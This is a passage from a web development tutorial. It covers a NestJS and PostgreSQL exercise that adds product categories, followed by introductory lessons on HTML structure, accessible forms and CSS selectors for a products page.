└── test/products.e2e-spec.ts                               6.7

Compare it with the tiny products API without a framework in Part 3.7: the same idea (receive, validate, store, respond), now with structure, guarantees and tests.

How a Senior Backend Engineer thinks about this

A senior would recognise this project as a sound starting point, and would also see exactly what is missing for production: authentication (Part 44), idempotency for retried creates (Part 18.12), structured JSON logs, metrics and traces (Part 47), a CI pipeline that runs the tests and builds the image (Part 51), and migrations run as a separate deploy step (Part 27). None of those require changing the shape you built. That is the point of getting the shape right first.

Practical exercise

The capstone for Volume 0: extend the project with one new resource, categories, and link products to it.

Acceptance criteria:

  • A categories table created by a new migration, with a unique slug, and a category_id foreign key on products (Part 20.5 explains foreign keys).
  • POST /categories, GET /categories, and GET /products?category=<slug> with the same cursor pagination as 6.5.
  • Every error uses the shape from 6.6; creating a product with an unknown category returns 422 with code: "CATEGORY_NOT_FOUND" and issues[0].path equal to categoryId.
  • Unit and e2e tests for the new endpoints pass, and the whole system starts with docker compose up --build.
  • The work is done on a branch, in focused commits, merged through a pull request (Part 5.11).

Worked answer to the exercise

Show worked answerHide worked answer

This is open-ended, so here is a model answer built only from the patterns of this Part, followed by what a strong answer includes.

The entity and the link. categories mirrors products. On Product, the foreign key column is nullable because existing products have no category, and adding a NOT NULL column to a table that already has rows would fail:

TypeScript
// src/categories/category.entity.ts
import { Column, CreateDateColumn, Entity, PrimaryGeneratedColumn } from 'typeorm';

@Entity('categories')
export class Category {
  @PrimaryGeneratedColumn('uuid')
  id!: string;

  @Column({ type: 'text' })
  name!: string;

  @Column({ type: 'text', unique: true })          // UNIQUE: two categories cannot share a slug
  slug!: string;

  @CreateDateColumn({ name: 'created_at', type: 'timestamptz' })
  createdAt!: Date;
}
TypeScript
// src/products/product.entity.ts (additions)
@Index('idx_products_category_id')                  // PostgreSQL does not index foreign keys by itself
@Column({ type: 'uuid', name: 'category_id', nullable: true })
categoryId!: string | null;

@ManyToOne(() => Category, { nullable: true, onDelete: 'RESTRICT' })
@JoinColumn({ name: 'category_id' })                // the FOREIGN KEY is on this column
category?: Category | null;

Add Category to entities in data-source.ts (otherwise TypeORM fails with No metadata for "Category" was found), run npm run migration:generate -- src/migrations/AddCategories, and read the result. Abridged, up must contain:

SQL
CREATE TABLE "categories" ("id" uuid NOT NULL DEFAULT gen_random_uuid(), "name" text NOT NULL, "slug" text NOT NULL,
  "created_at" TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now(),
  CONSTRAINT "UQ_categories_slug" UNIQUE ("slug"), CONSTRAINT "PK_categories_id" PRIMARY KEY ("id"));
ALTER TABLE "products" ADD "category_id" uuid;
CREATE INDEX "idx_products_category_id" ON "products" ("category_id");
ALTER TABLE "products" ADD CONSTRAINT "FK_products_category" FOREIGN KEY ("category_id")
  REFERENCES "categories"("id") ON DELETE RESTRICT ON UPDATE NO ACTION;

Validation. CreateProductDto gets @IsOptional() @IsUUID() categoryId?: string; (and create() passes categoryId: dto.categoryId ?? null to repo.create). CreateCategoryDto has name (@IsString() @Length(1, 100)) and slug (@Matches(/^[a-z0-9]+(?:-[a-z0-9]+)*$/) @Length(2, 64)). ListProductsQuery gets an optional category with the same slug pattern. CategoriesModule follows ProductsModule: TypeOrmModule.forFeature([Category]), a thin controller with @Post() and @Get(), and a service whose list() copies the cursor logic of 6.5 onto the categories table.

The filter. In list(), join only when filtering, and change the cursor's where to andWhere, or it replaces the category condition:

TypeScript
if (q.category) qb.innerJoin('p.category', 'c').andWhere('c.slug = :slug', { slug: q.category });
if (q.cursor) {
  const c = decodeCursor(q.cursor);
  qb.andWhere('(p.createdAt, p.id) < (:createdAt, :id)', { createdAt: c.createdAt, id: c.id });
}

Errors, decided by the database. As with the SKU in 6.6, the foreign key, not a SELECT beforehand, decides whether the category exists. The filter's single 23505 branch becomes a small table keyed by PostgreSQL error code and table (node-postgres puts both on driverError):

TypeScript
// src/common/api-exception.filter.ts (replaces the 23505 branch)
type DbRule = { status: HttpStatus; code: string; title: string; path: string };
const DB_RULES: Record<string, DbRule> = {
  '23505:products':   { status: HttpStatus.CONFLICT, code: 'PRODUCT_SKU_TAKEN', title: 'A product with this SKU already exists', path: 'sku' },
  '23505:categories': { status: HttpStatus.CONFLICT, code: 'CATEGORY_SLUG_TAKEN', title: 'A category with this slug already exists', path: 'slug' },
  '23503:products':   { status: HttpStatus.UNPROCESSABLE_ENTITY, code: 'CATEGORY_NOT_FOUND', title: 'The category does not exist', path: 'categoryId' },
};
const dbRule = (e: unknown): DbRule | undefined => {
  if (!(e instanceof QueryFailedError)) return undefined;
  const d = e.driverError as { code?: string; table?: string };
  return DB_RULES[`${d.code}:${d.table}`];
};

// in catch(): const rule = dbRule(exception); then, after the HttpException branch:
} else if (rule) {
  status = rule.status;
  code = rule.code;
  title = rule.title;
  issues = [{ path: rule.path, message: rule.title }];
} else {

Tests. products now references categories, so reset both in one statement: TRUNCATE TABLE products, categories (truncating categories alone fails, because a foreign key points at it). Two of the new e2e tests:

TypeScript
it('rejects an unknown category with 422 CATEGORY_NOT_FOUND on categoryId', async () => {
  const res = await request(app.getHttpServer()).post('/products')
    .send({ ...valid, categoryId: '9b1d5f8e-0000-4000-8000-000000000000' });
  expectProblem(res, 422, 'CATEGORY_NOT_FOUND');                    // the helper from 6.7
  expect(res.body.issues[0].path).toBe('categoryId');
});

it('filters products by category slug', async () => {
  const cat = await request(app.getHttpServer()).post('/categories').send({ name: 'Dental tools', slug: 'dental-tools' }).expect(201);
  await request(app.getHttpServer()).post('/products').send({ ...valid, categoryId: cat.body.id }).expect(201);
  await request(app.getHttpServer()).post('/products').send({ ...valid, sku: 'DM-002' }).expect(201);
  const res = await request(app.getHttpServer()).get('/products?category=dental-tools').expect(200);
  expect(res.body.items.map((p: { sku: string }) => p.sku)).toEqual(['DM-001']);
});

The Git side (Part 5.11): a branch such as feat/TSB-4620-categories, and commits like "Add Category entity, module and migration", "Link products to categories and filter by slug", "Map foreign key and slug violations to problem responses", "Test categories end to end", merged through a pull request.

What a strong answer includes. A migration that was read and completed, not trusted blindly; a nullable foreign key with an index; the database deciding both "slug taken" (409) and "category missing" (422), so there is no race; one error shape with issues[0].path equal to categoryId; cursor pagination reused rather than reinvented; an explicit decision on what ?category=unknown-slug returns (an empty page is the simplest; say so in the pull request); tests for the error paths, not only the happy path; and docker compose up --build from a clean checkout as the final check. The trap most people hit: keeping qb.where(...) for the cursor after adding the category filter, so page 2 silently shows products from every category. The "filters by slug" test catches it only if it walks to a second page, so add one that does.

Senior Checklist — Part 6

  • I understand the concept
  • I can explain it simply
  • I can implement it
  • I understand its failure modes
  • I understand its scaling limitations
  • I understand its security implications
  • I understand its operational implications
  • I can choose between alternatives
  • I can explain the tradeoffs
  • I can answer senior-level interview questions
  • I can scaffold a NestJS app and keep controllers thin, logic in services
  • I validate all input with DTOs and a global ValidationPipe (whitelist on)
  • I can write the four basic SQL statements and know why parameterization matters
  • I can connect NestJS to PostgreSQL via a TypeORM entity and repository
  • I know why synchronize:true is unsafe in production and what migrations are for
  • I can trace a request from HTTP through validation, service and repository to the database
  • I know which later Parts harden each layer for production
  • I validate query strings, path parameters and configuration, not only bodies, and bound every limit
  • I can implement cursor pagination with a unique tie-breaker
  • I return one error shape with stable codes, field paths and a request ID, and never leak internals
  • I let the database enforce uniqueness and map its error to a clear 409
  • I can write a NestJS unit test with a fake repository and an e2e test with supertest against a real test database
  • I can generate, read and complete a TypeORM migration
  • I can run the API and PostgreSQL with a multi-stage Dockerfile and Docker Compose with health checks

Part 6 — Key Takeaways

  • A backend is a loop: receive a request, validate it, run logic (kept separate from HTTP), persist to a store with real guarantees, return a response with the right status code.
  • NestJS organizes this into thin controllers (HTTP), services (logic), and repositories (data); keeping them separate makes everything testable and uniform.
  • Validate every incoming request with a DTO and a global ValidationPipe; whitelist and forbidNonWhitelisted block injected fields for free.
  • Understand the SQL even when an ORM writes it; parameterize always (never concatenate user input), and push invariants into the database as constraints.
  • Connect NestJS to PostgreSQL with a TypeORM entity and repository; you work in typed objects while the ORM generates safe, parameterized SQL.
  • Never ship synchronize: true; production schema changes go through reviewed migrations (Part 27).
  • Persistence is what makes it a backend: data lives in the database, surviving restarts and shared across every server instance.
  • Every input is a door: bodies, paths, query strings and configuration all need validation and bounds.
  • Errors are part of the API: one shape, stable codes, field paths, a request ID, and no internals in responses.
  • Tests turn "I checked it with curl once" into "it is checked on every change"; use a real database for e2e.
  • One docker compose up that starts everything is the difference between a project and a recipe.
  • Production systems are this same shape, hardened and scaled; add complexity (caching, queues, services) only when real pressure demands it.
  • The discipline practiced here — thin controllers, validated input, clean layering, safe SQL and schema, secrets out of git — is the same discipline that keeps large systems maintainable.
  • You can now build, test and run a small correct backend, which is the foundation every later Part builds on; Part 7 — Your First Frontend puts a browser screen in front of it and completes Volume 0.

Part 7 — Your First Frontend

  • 1 h 31 min read

What you will learn

  1. 7.1What a frontend is
  2. 7.2HTML: the structure of the page
  3. 7.3CSS: how the page looks
  4. 7.4JavaScript in the browser
  5. 7.5Calling the Part 6 API with fetch

In Part 6 you built a products API: NestJS, PostgreSQL, validated input, one error shape, tests and Docker. You talked to it with curl. Real users do not use curl. They open a browser, see a page, fill in a form and press a button. Somewhere between that button and your controller there is a frontend, and until you have built one yourself, half of every bug report will be a mystery to you: "the list is empty", "the form does nothing", "it says CORS".

This Part closes the loop with just enough HTML, CSS and browser JavaScript to build one honest screen for the Part 6 API: a Products page that lists products, creates one from a form, shows the API's validation errors next to the right fields, and deletes a product after asking first. Along the way you meet CORS for real and fix it properly in NestJS, learn to read DevTools the way you read curl -v, and decide where the frontend should be served from. We use no framework and no build step on purpose: React, Vite and Next.js (Volume 7, Parts 75–85) all produce HTML, CSS and JavaScript that call fetch in the end. Understand that layer and the frameworks are conveniences; skip it and they are magic, and magic is hard to debug at 2 a.m.

Everything here talks to the Part 6 API exactly as Part 6 left it: http://localhost:3000, GET /products?limit=&cursor= returning { items, nextCursor }, POST /products with name, priceCents, sku and an optional currency, DELETE /products/:id returning 204, and every error as application/problem+json with status, code, issues and requestId (6.6). Start it with docker compose up (6.8) or npm run start:dev (6.1) before you try the examples.

7.1 What a frontend is

7.1.1 The browser's half of the request-response loop

Concept

A frontend is the part of an application that runs on the user's device and that the user sees and touches. For a web application, the frontend is a set of files the browser downloads and runs: an HTML document (the structure and content: headings, forms, lists), CSS stylesheets (how it looks: colours, spacing, layout) and JavaScript (behaviour: what happens when you click, and calls to your API).

The backend is what you built in Part 6: code on a server that owns the data and the rules. The frontend asks; the backend decides. A frontend can make a form friendlier, but it can never be trusted to enforce a rule, because the user controls their own browser completely.

Why does it exist?

Because your API speaks JSON, and people do not read JSON. Someone has to turn {"items":[{"name":"Dental Mirror","priceCents":1299}]} into a card that says "Dental Mirror, $12.99" with a Delete button, and turn a typed price of 12.99 back into {"priceCents":1299}. That translation, in both directions, is the frontend's job. Without it, only engineers can use your product.

There is a second reason that matters to a backend engineer. The browser is the most demanding client your API will ever have. It enforces security rules (same-origin policy, CORS, mixed content) that curl and Postman ignore, it retries and caches in its own ways, and its users double-click. An API that has only ever been called from curl has not really been tested.

Mental model

Imagine a restaurant. The kitchen (the backend) owns the ingredients and the recipes; nothing leaves it without the chef's approval. The dining room (the frontend) is where guests sit: menus, tables, a waiter. The waiter takes an order in words the guest understands, translates it into a ticket the kitchen understands, and brings back the plate. The dining room can be beautiful or plain, but it never cooks. If a guest writes "free dessert" on their own ticket, the kitchen still decides.

How it works

You already know from Part 3 (3.6) that one page view is many request-response exchanges. Here is the same picture for the Products screen we will build, with the static files served from one place and the API from another:

Step by step:

  1. The HTML document arrives first. It is the only file the user asked for directly. The browser reads it top to bottom and builds an in-memory tree of the page, called the DOM (Document Object Model; 7.4).
  2. The HTML names other files. A <link rel="stylesheet"> asks for CSS; a <script> asks for JavaScript. The browser fetches them, often in parallel.
  3. CSS is applied to the tree, which decides where every box goes and what it looks like.
  4. JavaScript runs. It can read and change the DOM, listen for clicks and submits, and call your API with fetch (7.5).
  5. The API answers with JSON, not HTML. JavaScript turns that JSON into new elements in the page. The page itself never reloads.
  6. The loop continues as the user interacts: every click that needs data is another request-response exchange with your API.

The important shift from Part 3: when the browser itself requests a page, it shows whatever comes back. When JavaScript requests data with fetch, nothing appears on screen unless your code puts it there. That is why "the API returned 200 but the page is empty" is such a common bug report (7.7 walks through it).

Practical example

Here is the smallest possible frontend that talks to the Part 6 API. Save it as hello.html. Do not open it yet; 7.6 and 7.8 explain why opening it straight from disk will fail, and that failure is a lesson in itself.

HTML
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Products</title>
</head>
<body>
  <h1>Products</h1>
  <ul id="list"></ul>
  <script type="module">
    const res = await fetch('http://localhost:3000/products?limit=5');
    const page = await res.json();                       // { items: [...], nextCursor: ... }
    const list = document.querySelector('#list');
    for (const p of page.items) {
      const li = document.createElement('li');
      li.textContent = `${p.name}: ${p.priceCents} cents`; // textContent, never innerHTML (7.4)
      list.append(li);
    }
  </script>
</body>
</html>

Twenty-one lines, and every idea in this Part is already in it: a document, a place in the page to put things, a fetch to the API, JSON turned into elements. The rest of the Part makes each line robust: styled, accessible, safe against hostile data, honest about errors, and allowed by CORS.

How a Senior Backend Engineer thinks about this

A senior backend engineer does not need to be a designer, but they understand the browser as a client well enough to design APIs that serve it: response shapes that are easy to render, error bodies that point at fields, CORS configured on purpose, and no rule that lives only in the frontend. When a frontend colleague reports a bug, they can open DevTools, find the request, and say within a minute whether the API or the page is wrong. That one skill saves days of "works on my machine" ping-pong between teams.

Interview questions

  1. What does the browser download first when a user opens a web app, and what happens next?
    Show answerHide answer
    The HTML document; it parses it into the DOM, fetches the CSS and JavaScript the HTML references, applies styles, runs the scripts, and the scripts call APIs for data.
  2. Why can't the frontend enforce business rules?
    Show answerHide answer
    The user controls the browser completely: they can edit the page, change the JavaScript or call the API with curl. The backend must validate everything again.
  3. Your API returns 200 with correct data but the page shows nothing. Where do you look?
    Show answerHide answer
    The browser's Console for script errors and the Network panel to compare the response shape with what the code expects; fetch puts nothing on screen by itself.

Practical exercise

Without writing any code yet, open any shopping site with DevTools open (F12, or Cmd+Option+I on a Mac), go to the Network panel, and reload. Put the requests into four groups: the HTML document, stylesheets, scripts, and API calls returning JSON. Acceptance criteria: you can name at least one request in each group and say which request came first and why.

Worked answer to the exercise

Show worked answerHide worked answer

On a typical product page, the first row is the document itself (type document), because the browser only learns about everything else by reading it. Stylesheets and scripts named in the HTML come next, then images and fonts. API calls (type fetch or xhr, JSON in the Preview tab) appear later, because JavaScript had to download and run before it could start them. Our Products screen in 7.9 produces exactly this order: index.html, styles.css, app.js, api.js, then GET /products?limit=20.

7.2 HTML: the structure of the page

7.2.1 Document structure, semantic elements, links, lists and tables

Concept

HTML (HyperText Markup Language) describes what is on a page and what each part is: this is a heading, this is a list, this is a navigation area, this is a table of numbers. It is made of elements, written as tags: <h1>Products</h1> is an h1 element containing the text "Products". Elements can have attributes that add information, like <a href="/products">, and they nest inside each other to form a tree.

Semantic HTML means choosing the element that matches the meaning: <button> for something you press, <nav> for navigation, <table> for tabular data, rather than a <div> styled to look like those things. The browser, search engines and screen readers all rely on that meaning.

Why does it exist?

Because a page has to work for many readers at once. A sighted user sees layout. A blind user hears the page through a screen reader, software that reads the page aloud and lets the user jump between headings, links and form fields; it can only do that if the HTML says which things are headings, links and fields. A keyboard user moves with Tab; a real <button> is focusable and activates with Enter and Space for free, while a <div onclick> is not. Semantic HTML is the cheapest accessibility you will ever get, and accessibility is not optional: in many countries it is a legal requirement for commercial sites.

Mental model

Imagine a well-run warehouse. Every shelf has a label: "fragile", "returns", "dental instruments". Any worker, a forklift robot, or an auditor can find things because the labels describe what is there, not what colour the shelf is painted. HTML elements are those labels. CSS paints the shelves; semantic HTML tells everyone what is on them.

How it works

Every HTML document has the same skeleton:

HTML
<!doctype html>                         <!-- "this is modern HTML"; without it browsers use old quirks rules -->
<html lang="en">                        <!-- lang tells screen readers which language to speak -->
<head>                                  <!-- information ABOUT the page; not shown in the page body -->
  <meta charset="utf-8">                <!-- read the bytes as UTF-8, so names like "Søren" survive -->
  <meta name="viewport" content="width=device-width, initial-scale=1">  <!-- render at phone width on phones -->
  <title>Products - Shop Admin</title>  <!-- shown in the browser tab and bookmarks -->
  <link rel="stylesheet" href="styles.css">
</head>
<body>                                  <!-- everything the user sees -->
  <header>...</header>
  <main>...</main>
  <footer>...</footer>
</body>
</html>

The elements you will use most, grouped by job:

Job Elements Notes
Page regions <header>, <nav>, <main>, <section>, <article>, <aside>, <footer> One <main> per page; screen readers offer "jump to main content"
Headings <h1> to <h6> One <h1> for the page, then nested levels without skipping; they form an outline
Text <p>, <strong>, <em>, <code> <strong> means important, not merely bold
Links <a href="..."> Goes somewhere (a new URL); a button does something
Lists <ul> (unordered), <ol> (ordered), <li> (item) Screen readers announce "list, 12 items"
Tables <table>, <caption>, <thead>, <tbody>, <tr>, <th>, <td> For data with rows and columns, never for layout
Generic boxes <div> (block), <span> (inline) Only when no semantic element fits

Links versus buttons is the distinction beginners blur most. A link (<a href>) navigates: it changes the URL, works with "open in new tab", and is announced as "link". A button performs an action on the current page: submit a form, delete a product, open a dialog. "Delete" must be a <button>, never a link: a link is a GET, and Part 3 (3.5) told the story of a crawler that followed GET /product_delete?id=5 links and deleted products.

Lists and tables. Our product list could be either. A list of cards (<ul> of <li>) reflows nicely on a phone. A table is better when users compare columns, such as price and stock across 50 products:

HTML
<table>
  <caption>Products, newest first</caption>      <!-- a title the screen reader announces with the table -->
  <thead>
    <tr><th scope="col">Name</th><th scope="col">SKU</th><th scope="col">Price</th></tr>
  </thead>
  <tbody>
    <tr><td>Dental Mirror</td><td>DM-001</td><td>$12.99</td></tr>
    <tr><td>Dental Probe</td><td>DP-002</td><td>$8.99</td></tr>
  </tbody>
</table>

scope="col" tells assistive technology that each <th> labels its column, so a screen reader reading a price cell can say "Price, $12.99".

Practical example

The Products page in 7.9 uses exactly these pieces: a <header> with the <h1> and a Refresh <button>, a <main> with two <section>s (the form and the list), and a <ul> for the product cards. Each section carries aria-labelledby="..." pointing at its heading's id, so a screen reader user listing the page's regions hears "New product, region". ARIA (Accessible Rich Internet Applications) attributes add meaning that HTML alone cannot express; the first rule of ARIA is to use a native element whenever one exists. The status line has role="status", a polite live region: when JavaScript puts "No products yet" into it, the screen reader announces it without moving focus.

Edge cases & failure modes

  • Missing <!doctype html> puts the browser in "quirks mode", where old layout rules apply and CSS behaves strangely.
  • Missing <meta charset="utf-8"> can turn "Søren" or "₹" into garbage characters, even though your API returned correct UTF-8 JSON.
  • Missing viewport meta tag makes phones render the page as a tiny desktop page that users must pinch to read.

7.2.2 Forms, inputs and labels

Concept

A form collects input from the user and sends it somewhere. It is a <form> element containing controls: <input> (text, number, email, checkbox and more), <select> (a drop-down), <textarea> (multi-line text) and a <button type="submit">. Every control needs a label, a visible piece of text tied to it, so that everyone knows what to type and a screen reader can announce it.

Why does it exist?

Forms are how data enters your system. Before JavaScript was common, forms were the only way: the browser itself would package up the fields and send an HTTP request. That built-in behaviour still exists and still runs unless your code stops it, which is why you need to know exactly what it does.

How it works

The create form for products, with labels tied to inputs by for and id:

HTML
<form id="create-form">
  <div class="field">
    <label for="name">Name</label>
    <input id="name" name="name" required maxlength="200" autocomplete="off"
           aria-describedby="name-error">
    <p class="error" id="name-error" data-error-for="name"></p>
  </div>
  <div class="field">
    <label for="sku">SKU</label>
    <input id="sku" name="sku" required pattern="[A-Z0-9\-]{3,32}"
           aria-describedby="sku-hint sku-error">
    <p class="hint" id="sku-hint">3 to 32 capital letters, digits or hyphens, for example DM-001</p>
    <p class="error" id="sku-error" data-error-for="sku"></p>
  </div>
  <div class="field">
    <label for="price">Price</label>
    <input id="price" name="price" type="number" min="0" step="0.01" required
           inputmode="decimal" aria-describedby="price-error">
    <p class="error" id="price-error" data-error-for="price"></p>
  </div>
  <div class="field">
    <label for="currency">Currency</label>
    <select id="currency" name="currency">
      <option value="USD">USD</option>
      <option value="EUR">EUR</option>
      <option value="INR">INR</option>
    </select>
  </div>
  <button type="submit">Add product</button>
</form>

What each piece does:

  1. <label for="price"> with <input id="price"> ties the caption to the field. Clicking the label focuses the input, which makes small checkboxes and touch screens far easier to hit, and the screen reader says "Price, edit text, required" when the field gets focus. A placeholder is not a label: it disappears as soon as you type.
  2. name="price" is the key under which the value is sent. id is for the page; name is for the data.
  3. Constraint attributes (required, maxlength, min, step, pattern) make the browser check the field before submitting and show its own message. These mirror the Part 6 DTO rules (@Length(1, 200), the SKU @Matches), so the user gets instant feedback. They are a courtesy, not a defence: the server validates again, always.
  4. type="number" with inputmode="decimal" shows a numeric keypad on phones. The user types dollars (12.99); the API wants cents (priceCents: 1299). The translation happens in JavaScript (7.5), never in the user's head.
  5. aria-describedby links the input to its hint and its error paragraph, so when an error appears, a screen reader reads it along with the field. The empty <p data-error-for="price"> is where 7.5 will put the API's message for the priceCents field.

What the browser does on submit, if you let it. With no JavaScript involved, pressing "Add product" makes the browser:

  1. Run the built-in constraint checks; if any fail, show a message and stop.
  2. Collect every named control into a body. With method="post" the default encoding is application/x-www-form-urlencoded: name=Dental+Mirror&sku=DM-001&price=12.99&currency=USD. With the default method="get" the same string goes into the URL's query string instead.
  3. Send that request to the URL in the form's action attribute (the current page's URL if there is none).
  4. Navigate: throw away the current page and display whatever the server returned.

Practical example

Try it against the Part 6 API with <form method="post" action="http://localhost:3000/products"> around the fields above. NestJS's Express adapter parses URL-encoded bodies as well as JSON, so the request reaches the ValidationPipe, and the page is replaced by raw JSON:

JSON
{"type":"about:blank","title":"Validation failed","status":400,"code":"VALIDATION_FAILED",
 "issues":[{"path":"price","message":"property price should not exist"},
           {"path":"priceCents","message":"priceCents must be an integer number"}],
 "requestId":"3e1f..."}

(Messages abridged.) Three lessons in one response. The form sends field names, not DTO names: price is not in CreateProductDto, so forbidNonWhitelisted rejects it. A URL-encoded body has only strings, so even a field named priceCents would arrive as "1299" and fail @IsInt(). And the user has left your page for a wall of JSON. This is why a frontend for a JSON API intercepts the submit, converts the values, and sends JSON with fetch (7.5).

Notice also what did not happen: the browser did not block this cross-origin POST. A plain form submission is a navigation, not a script reading a response, so CORS (7.6) does not stop it. The server received the request and ran it. That is exactly the gap Cross-Site Request Forgery exploits once cookies are involved; Part 44 (44.22) and Part 81 (81.6) cover the defences.

Edge cases & failure modes

  • A <button> inside a form defaults to type="submit". A "Cancel" or "Refresh" button without type="button" submits the form.
  • Pressing Enter in a text field submits the form, so your submit handler must handle keyboard submits, not only clicks; listening for the form's submit event (not the button's click) covers both.
  • type="number" accepts things like 1e3 and its value is still a string in JavaScript; convert and validate it in code.

How a Senior Backend Engineer thinks about this

A senior sees the form and the DTO as two views of one contract. Field names, limits and patterns in the HTML should match the DTO so the user hears about problems before a round trip, and every server issues[].path should map to exactly one field on screen. They never rely on the HTML checks for safety, because anyone can remove them in DevTools in five seconds. And they label every field from day one, because adding accessibility later means touching every form twice.

Common mistakes

  • Using placeholder instead of a <label>; the hint vanishes when typing starts and screen readers may not announce it.
  • Letting the browser's default submit run and wondering why the page "refreshes" and loses everything.
  • Sending form field names straight to the API without mapping them to the DTO, then hitting property price should not exist.
  • Forgetting type="button" on non-submit buttons inside a form.

Interview questions

  1. What is the difference between a link and a button, and why does it matter for a delete action?
    Show answerHide answer
    A link navigates with a GET; a button performs an action. Deletes must not be GETs, because crawlers, prefetchers and link previews follow links.
  2. Why should every input have a <label>?
    Show answerHide answer
    It names the field for screen readers, makes the label clickable, and stays visible while typing; placeholders do none of that reliably.
  3. What does a browser send when a form is submitted with method="post" and no JavaScript?
    Show answerHide answer
    A POST to the action URL with an application/x-www-form-urlencoded body of every named control, then it navigates to the response.
  4. Does CORS stop a cross-origin HTML form POST from reaching your API?
    Show answerHide answer
    No. A form submission is a navigation, so the request is sent and executed; CORS only controls whether scripts can read responses. That is why CSRF defences exist.

Practical exercise

Write the HTML (no CSS, no JavaScript) for a product details page: a page title, a navigation link back to the list, the product name as the main heading, a short description, a table of the last three price changes (date, old price, new price), and a small form to change the price with a labelled input and a submit button. Acceptance criteria: one <h1>, a <nav>, a <main>, a table with <caption> and scope on its headers, every input labelled, and buttons with explicit type.

Worked answer to the exercise

Show worked answerHide worked answer
HTML
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Dental Mirror - Shop Admin</title>
</head>
<body>
  <nav><a href="/app/">Back to all products</a></nav>
  <main>
    <h1>Dental Mirror</h1>
    <p>Front-surface mirror, size 4, autoclavable.</p>
    <table>
      <caption>Last three price changes</caption>
      <thead>
        <tr><th scope="col">Date</th><th scope="col">Old price</th><th scope="col">New price</th></tr>
      </thead>
      <tbody>
        <tr><td>2026-10-02</td><td>$11.99</td><td>$12.49</td></tr>
        <tr><td>2026-10-20</td><td>$12.49</td><td>$12.99</td></tr>
        <tr><td>2026-11-05</td><td>$12.99</td><td>$13.49</td></tr>
      </tbody>
    </table>
    <form id="price-form">
      <label for="new-price">New price</label>
      <input id="new-price" name="price" type="number" min="0" step="0.01" required inputmode="decimal">
      <button type="submit">Change price</button>
    </form>
  </main>
</body>
</html>

The link navigates; "Change price" acts, so it is a submit button. The caption and scope="col" let a screen reader announce "New price, $13.49" for any cell. Later, JavaScript would send PATCH /products/:id with {"priceCents": 1349} (6.5).

7.3 CSS: how the page looks

7.3.1 Selectors, the cascade, specificity and the box model

Concept

CSS (Cascading Style Sheets) decides how HTML looks: colours, fonts, spacing, borders and, most importantly, layout. A stylesheet is a list of rules. Each rule has a selector that picks elements and a block of declarations that say what to do with them:

CSS
/* selector        { property: value; } */
.card h3           { margin: 0; font-size: 1rem; }

When several rules target the same element and disagree, the cascade decides which declaration wins. Every element is drawn as a rectangle, and the box model describes the layers of that rectangle: content, padding, border and margin.

Why does it exist?

Because structure and appearance change for different reasons and at different speeds. The HTML for a product card should not change when the brand colour does. Keeping looks in CSS means one stylesheet can restyle every page, the same HTML can look right on a phone and a 27-inch monitor, and a user who needs larger text or high contrast can override your styles without breaking the page.

Mental model

Imagine a dress code. The company says "business casual", your department says "no ties", your manager says "Alex, wear a tie today". The more specific rule wins, and between equally specific rules the one posted last wins: that is the cascade. The box model is packaging: the item (content), bubble wrap (padding), the box (border) and the space left around it on the shelf (margin).

How it works

Selectors you will actually use:

Selector Matches Example
Type every element of that kind button
Class elements with class="card" .card
ID the one element with id="status" #status
Attribute elements with an attribute or value [aria-invalid="true"]
Descendant h3 anywhere inside .card .card h3
Child li directly inside .cards .cards > li
Pseudo-class elements in a state button:disabled, input:focus-visible, li:first-child

Prefer classes for styling. IDs are for JavaScript and for label for; styling with them makes rules hard to override, as specificity will show.

The cascade decides between conflicting declarations in this order:

(The full algorithm also weighs browser default styles, user styles and cascade layers; for your own stylesheet, this is the part that matters.)

Specificity is a score with three columns, compared left to right like version numbers: IDs, then classes/attributes/pseudo-classes, then element types.

Text
h3                          (0, 0, 1)
.card h3                    (0, 1, 1)
.cards > .card h3           (0, 2, 1)
[aria-invalid="true"]       (0, 1, 0)
#product-list .card h3      (1, 1, 1)   <- one ID beats any number of classes

So #product-list .card h3 { color: red } beats .card h3 { color: blue } no matter where each rule appears. This is why ID selectors cause trouble: to override them later you need another ID or !important, and each escalation makes the next override harder. Keep selectors short and class-based, and specificity fights rarely happen.

Inheritance is separate from the cascade. Some properties, mostly text ones like color, font-family and line-height, pass from parent to child automatically. Box properties like border, padding and margin do not. Set the font once on body and every element below inherits it.

The box model. Every element is a box with four layers:

Text
+------------------------------------------+
|                 margin                    |   space outside, between this box and others
|   +----------------------------------+   |
|   |             border               |   |   the visible edge
|   |   +--------------------------+   |   |
|   |   |         padding          |   |   |   space inside the border, around the content
|   |   |   +------------------+   |   |   |
|   |   |   |     content      |   |   |   |   the text or children
|   |   |   +------------------+   |   |   |
|   |   +--------------------------+   |   |
|   +----------------------------------+   |
+------------------------------------------+

By default, width: 300px sets only the content width, so adding padding: 16px and a 1px border makes the box 334 pixels wide, and layouts overflow. Nearly every modern stylesheet starts with one rule that makes width include padding and border:

CSS
*, *::before, *::after { box-sizing: border-box; }   /* width now means the visible box */

Practical example

The base styles for our Products screen. Custom properties (CSS variables, written --name and read with var(--name)) keep colours and spacing in one place:

CSS
:root {                          /* :root is the <html> element; variables here are global */
  --gap: 1rem;                   /* 1rem = the root font size, usually 16px */
  --border: #d0d5dd;
  --text: #1d2939;
  --muted: #667085;
  --danger: #b42318;
}
*, *::before, *::after { box-sizing: border-box; }
body { margin: 0; font-family: system-ui, sans-serif; color: var(--text); line-height: 1.5; }
input, select, button { font: inherit; padding: 0.5rem 0.75rem; }   /* form controls do not inherit fonts by default */
.error { color: var(--danger); margin: 0; }
.error:empty { display: none; }                                      /* hide error slots until they have text */
input[aria-invalid="true"] { border: 2px solid var(--danger); }      /* the same attribute the screen reader uses */
button:disabled { opacity: 0.6; cursor: not-allowed; }
:focus-visible { outline: 3px solid #2e90fa; outline-offset: 2px; } /* a clear focus ring for keyboard users */

Two details worth copying. Styling input[aria-invalid="true"] means the visual error state and the accessible error state come from one attribute, so they can never disagree. And the :focus-visible rule keeps a strong outline for keyboard users; removing focus outlines with outline: none is one of the most common accessibility bugs on the web.

Edge cases & failure modes

  • A rule "does nothing": usually a more specific selector elsewhere wins. DevTools' Styles pane (7.7) shows the losing declaration crossed out and which rule beat it.
  • Colour-only errors: red text alone fails users with colour blindness; the error message text and the thicker border carry the meaning too.
  • Low contrast: grey #999 text on white is hard to read; aim for a contrast ratio of at least 4.5:1 for body text (WCAG, the Web Content Accessibility Guidelines).

7.3.2 Layout: flexbox, a simple grid and one media query

Concept

